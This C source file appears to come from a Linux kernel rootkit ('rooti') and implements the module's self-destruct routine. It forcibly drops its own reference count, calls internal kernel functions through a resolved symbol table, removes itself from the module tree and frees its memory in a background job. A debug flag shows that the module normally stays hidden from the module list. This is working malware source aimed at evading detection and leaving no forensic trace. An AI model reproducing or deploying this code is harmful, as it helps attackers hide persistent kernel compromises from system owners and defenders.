#include <linux/workqueue.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/notifier.h>
#include <linux/async.h>
#include "unloading.h"
#include "../utils.h"

// Implemented in asm/unloading.S
void rooti_free_mod_mem(struct work_struct *work);
DECLARE_WORK(rooti_mem_free_work, rooti_free_mod_mem);

void *rooti_text_section_base = NULL;
void *rooti_data_section_base = NULL;
void *rooti_rodata_section_base = NULL;

#define MODULE_REF_BASE 1

// Directly copied from the kernel
static int __try_release_module_ref(struct module *mod)
{
	int ret = atomic_sub_return(MODULE_REF_BASE, &mod->refcnt);
	BUG_ON(ret < 0);
	if (ret)
		ret = atomic_add_unless(&mod->refcnt, MODULE_REF_BASE, 0);

	return ret;
}

// Similar to the kernel's free_module()
static void rooti_self_free(void)
{
#ifdef ROOTI_DEBUG_SHOW_ME
    rooti_sym_repo.mod_sysfs_teardown(THIS_MODULE);
#endif

    mutex_lock(rooti_sym_repo.module_mutex);
    THIS_MODULE->state = MODULE_STATE_UNFORMED;
    mutex_unlock(rooti_sym_repo.module_mutex);

    rooti_sym_repo.module_arch_cleanup(THIS_MODULE);

    rooti_sym_repo.module_unload_free(THIS_MODULE);

    rooti_sym_repo.module_destroy_params(THIS_MODULE->kp, THIS_MODULE->num_kp);

    mutex_lock(rooti_sym_repo.module_mutex);

#ifdef ROOTI_DEBUG_SHOW_ME
    list_del_rcu(&THIS_MODULE->list);
#endif

    rooti_sym_repo.mod_tree_remove(THIS_MODULE);

    rooti_sym_repo.module_bug_cleanup(THIS_MODULE);

    synchronize_rcu();

    mutex_unlock(rooti_sym_repo.module_mutex);

    rooti_sym_repo.module_arch_freeing_init(THIS_MODULE);

    kfree(THIS_MODULE->args);

    // Inlined percpu_modfree()
    free_percpu(THIS_MODULE->percpu);
}

// Similar to the kernel's sys_delete_module() but modified to unload self
static int rooti_self_uninitialize(void)
{
	// Signals are not expected as this runs in the background
	mutex_lock(rooti_sym_repo.module_mutex);

	if (THIS_MODULE->state != MODULE_STATE_LIVE) {
	    mutex_unlock(rooti_sym_repo.module_mutex);
	    return -EBUSY;
	}

	// Inlined and modified version of try_stop_module().
	// We always want to unload forcefully
	__try_release_module_ref(THIS_MODULE);
	THIS_MODULE->state = MODULE_STATE_GOING;

	mutex_unlock(rooti_sym_repo.module_mutex);

	THIS_MODULE->exit();

	blocking_notifier_call_chain(rooti_sym_repo.module_notify_list, MODULE_STATE_GOING, THIS_MODULE);

	rooti_sym_repo.klp_module_going(THIS_MODULE);
	rooti_sym_repo.ftrace_release_mod(THIS_MODULE);

	async_synchronize_full();

	rooti_self_free();

	return 0;
}

int rooti_self_destruct(void)
{
    int err;

    rooti_text_section_base = THIS_MODULE->mem[MOD_TEXT].base;
    rooti_data_section_base = THIS_MODULE->mem[MOD_DATA].base;
    rooti_rodata_section_base = THIS_MODULE->mem[MOD_RODATA].base;

    err = rooti_self_uninitialize();
    if (err) {
        return err;
    }

    // Schedule background work to cleanup the module's memory
	queue_work(system_long_wq, &rooti_mem_free_work);
	return 0;
}
